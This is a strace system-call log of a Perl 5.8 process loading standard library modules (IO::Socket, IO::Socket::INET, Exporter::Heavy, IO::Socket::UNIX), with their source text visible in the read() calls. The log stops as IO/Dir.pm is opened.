8458  07:23:31.507703 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
8458  07:23:31.508190 _llseek(6, 6698, [6698], SEEK_SET) = 0
8458  07:23:31.508207 _llseek(6, 0, [6698], SEEK_CUR) = 0
8458  07:23:31.508217 close(6)          = 0
8458  07:23:31.508236 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.508250 stat64("/etc/perl/IO/Socket/INET.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.508264 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.508277 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.508291 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.508304 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.508318 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.508330 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.508344 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.508356 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.508369 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.508382 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
8458  07:23:31.508404 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
8458  07:23:31.508418 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dc458) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.508430 _llseek(6, 0, [0], SEEK_CUR) = 0
8458  07:23:31.508458 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
8458  07:23:31.508817 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.508833 stat64("/etc/perl/Exporter/Heavy.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.508846 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.508859 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.508873 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.508886 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.508900 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.508912 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.508926 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.508953 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.508998 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.509041 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.509055 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.509069 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
8458  07:23:31.509091 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
8458  07:23:31.509122 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dbfa8) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.509134 _llseek(8, 0, [0], SEEK_CUR) = 0
8458  07:23:31.509152 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
8458  07:23:31.509435 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
8458  07:23:31.509679 brk(0x829c000)    = 0x829c000
8458  07:23:31.509926 read(8, "", 4096) = 0
8458  07:23:31.522481 close(8)          = 0
8458  07:23:31.523673 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
8458  07:23:31.524099 _llseek(6, 6496, [6496], SEEK_SET) = 0
8458  07:23:31.524116 _llseek(6, 0, [6496], SEEK_CUR) = 0
8458  07:23:31.524127 close(6)          = 0
8458  07:23:31.524189 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.524205 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.524220 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.524233 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.524247 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.524260 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.524274 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.524287 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.524300 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.524312 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.524326 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.524339 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
8458  07:23:31.524362 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
8458  07:23:31.524378 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dc458) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.524405 _llseek(6, 0, [0], SEEK_CUR) = 0
8458  07:23:31.524451 brk(0x82bd000)    = 0x82bd000
8458  07:23:31.524500 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
8458  07:23:31.525459 _llseek(6, 1386, [1386], SEEK_SET) = 0
8458  07:23:31.525490 _llseek(6, 0, [1386], SEEK_CUR) = 0
8458  07:23:31.525502 close(6)          = 0
8458  07:23:31.525572 stat64("/etc/perl/IO/Dir.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.525587 stat64("/etc/perl/IO/Dir.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.525601 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.525613 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.525627 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.525639 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.525653 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.525664 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.525677 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.525689 stat64("/usr/share/perl5/IO/Dir.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.525702 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.525714 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
8458  07:23:31.525735 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
